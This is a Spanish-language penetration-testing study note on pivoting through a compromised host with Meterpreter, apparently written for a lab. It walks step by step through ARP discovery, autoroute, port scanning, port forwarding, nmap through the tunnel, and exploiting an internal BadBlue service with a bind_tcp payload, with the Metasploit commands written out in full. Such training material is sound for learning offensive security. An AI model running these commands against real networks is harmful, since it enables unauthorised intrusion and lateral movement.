# Pivoting con Meterpreter + Descubrimiento de IPs internas

## 1. ¿Qué es pivotear?
Pivotear es utilizar una máquina comprometida como punto de salto para acceder a otras redes o máquinas que no son alcanzables directamente desde nuestro host atacante.

Se usa cuando:
- El host atacante no tiene visibilidad directa de ciertos objetivos.
- Queremos realizar **movimientos laterales** en una red interna.
- Queremos aprovechar la posición de la máquina comprometida como **puente**.

---

## 2. Flujo de trabajo con descubrimiento previo

### Paso 1: Ganar acceso y revisar la red
Desde la sesión Meterpreter:
```bash
meterpreter > sysinfo
meterpreter > ipconfig
```
- Identificamos las interfaces y redes a las que la máquina comprometida tiene acceso.

---

### Paso 2: Descubrir otras máquinas en la red con ARP Scan
Si no conocemos la IP de la segunda máquina, podemos usar:
```bash
run arp_scanner -r 10.0.28.0/24
```
- `-r`: Rango de IPs a escanear.
- Nos devolverá una lista de IPs y direcciones MAC activas en la red interna.

Con esto detectamos hosts que están encendidos y pueden ser potenciales objetivos.

---

### Paso 3: Configurar pivoting con autoroute
Seleccionamos la subred encontrada (por ejemplo, `10.0.28.0/20`) y la añadimos:
```bash
run autoroute -s 10.0.28.0/20
```
Esto enruta el tráfico hacia esa subred a través de la sesión Meterpreter.

---

### Paso 4: Mandar la sesión al background y renombrarla
```bash
background
sessions -n "victima1"
```
Esto ayuda a mantener organizado el trabajo.

---

### Paso 5: Escanear la red interna
Usamos un escáner de puertos:
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.28.130
set PORTS 1-100
exploit
```
- Así identificamos puertos abiertos en la máquina interna.

---

### Paso 6: Crear un Port Forwarding
Supongamos que encontramos un HTTP en el puerto 80:
```bash
portfwd add -l 1234 -p 80 -r 10.0.28.130
```
Esto nos permite acceder al servicio HTTP de la máquina interna desde nuestro host atacante en `localhost:1234`.

---

### Paso 7: Escaneo desde nuestro host
```bash
db_nmap -sS -sV -p 1234 localhost
```
Así identificamos el servicio y versión reales.

---

### Paso 8: Explotación de un servicio interno
Si el escaneo detecta **BadBlue vulnerable**:
```bash
use exploit/windows/http/passthru
set payload windows/meterpreter/bind_tcp
set RHOSTS 10.0.28.130
set LPORT 4444
exploit
```
- Se usa `bind_tcp` porque trabajamos dentro de la red interna y queremos que el objetivo abra un puerto para conectarnos.

---

## 3. Resumen del proceso
1. **Comprometer una máquina** accesible.
2. **Descubrir IPs internas** con ARP scan.
3. **Configurar rutas** con `autoroute`.
4. **Escanear puertos** en objetivos internos.
5. **Redirigir puertos** con `portfwd`.
6. **Escanear desde el atacante** con `nmap`.
7. **Explotar vulnerabilidades** en máquinas internas.

---

## 4. Comando clave para descubrimiento
```bash
run arp_scanner -r <rango_subred>
```
Este paso es crucial si no conocemos las IPs internas antes de pivotear.
